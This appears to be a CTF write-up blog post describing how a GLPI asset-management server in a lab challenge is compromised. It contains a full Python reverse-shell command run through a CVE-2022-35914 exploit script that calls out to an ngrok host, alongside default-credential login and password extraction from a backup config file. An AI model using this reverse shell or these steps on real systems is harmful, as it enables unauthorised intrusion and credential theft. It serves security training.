---
title: 'CTFs | CTF-inter-INSA2024 | Realist | Gestion de parc'
author: Bipboup
date: 2024-04-05
categories: ['CTFs', 'CTF-inter-INSA2024', 'Realist']
tags: ['CTFs', 'CTF-inter-INSA2024', 'Realist']
permalink: /CTFs/CTF-inter-INSA2024/realist/gestion_de_parc
---

Let's run nmap on the target:

![nmap](/assets/img/CTFs/CTF-inter-INSA2024/realist/gestion_de_parc/nmap.png)

There are 2 open ports:
* 22 -> ssh
* 80 -> website

The website is running glpi which is an open source IT Asset Management, issue tracking system and service desk system.

![glpi_login](/assets/img/CTFs/CTF-inter-INSA2024/realist/gestion_de_parc/glpi_login.png)

I do not have the exact version of the software. After testing several exploits, I found online that the default credentials are glpi:glpi.

I logged in !

![glpi_dashboard](/assets/img/CTFs/CTF-inter-INSA2024/realist/gestion_de_parc/glpi_dashboard.png)

After searching for a while, I found an exploit on github to get RCE unauthenticated. Well I did not need the credentials 😅.

I started a ngrok and a listener, modified the script and launched a reverse shell.

```bash
python3 CVE-2022-35914.py -u http://172.10.0.52 -c "export RHOST=\"0.tcp.eu.ngrok.io\";export RPORT=12157;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"sh\")'"
```

![rs](/assets/img/CTFs/CTF-inter-INSA2024/realist/gestion_de_parc/rs.png)

Now we stabilize it:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'

CTRL + Z

stty raw -echo; fg
export TERM=xterm
```

We get the user flag in the /home/user directory:

![user_flag](/assets/img/CTFs/CTF-inter-INSA2024/realist/gestion_de_parc/user_flag.png)

The second challenge asks us to get the previous password of the mysql database.

The notes.txt file suggest that there is a backup of the website and we can access it.

I copy the archive to a writable directory.

```
cp /root/glpi.zip /tmp/archive/
unzip glpi.zip
```

In the config_db.php file, we get the previous mysql db password:

![mysql_password](/assets/img/CTFs/CTF-inter-INSA2024/realist/gestion_de_parc/mysql_password.png)

Fact: The current password of the db is also the user's password.

![user_privesc](/assets/img/CTFs/CTF-inter-INSA2024/realist/gestion_de_parc/user_privesc.png)
